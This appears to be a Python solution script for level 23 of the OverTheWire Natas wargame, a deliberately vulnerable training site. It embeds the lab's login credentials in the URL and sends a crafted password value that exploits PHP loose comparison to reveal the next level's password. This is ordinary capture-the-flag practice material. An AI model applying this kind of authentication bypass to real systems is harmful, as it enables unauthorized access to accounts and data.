import requests
import re

URL = 'http://natas23:D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE@natas23.natas.labs.overthewire.org/'        

def php_code():
    r = requests.get(f"{URL}?passwd=11iloveyou")
    return re.findall(r"Password: [^<]*", r.text)[0].split(': ')[1]

if __name__ == '__main__':
    if requests.head(URL).status_code == requests.codes.ok:
        print(f'Password = {php_code()}')
    else:
        print('Authentication Failed!')
